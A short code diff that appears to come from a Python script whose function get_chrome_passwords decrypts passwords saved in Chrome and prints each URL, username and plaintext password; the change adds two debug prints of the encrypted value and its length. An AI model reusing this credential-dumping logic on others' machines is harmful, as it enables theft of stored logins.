@@ -47,6 +47,8 @@ def get_chrome_passwords():
             encrypt_pass = r[3]
             decrypt_pass = dec(encrypt_pass)
             if len(decrypt_pass)!=0:
+                print(encrypt_pass)
+                print(len(encrypt_pass))
                 print(url,"[+]",username,"[+]",decrypt_pass)
     except Exception as e:
         print(e)
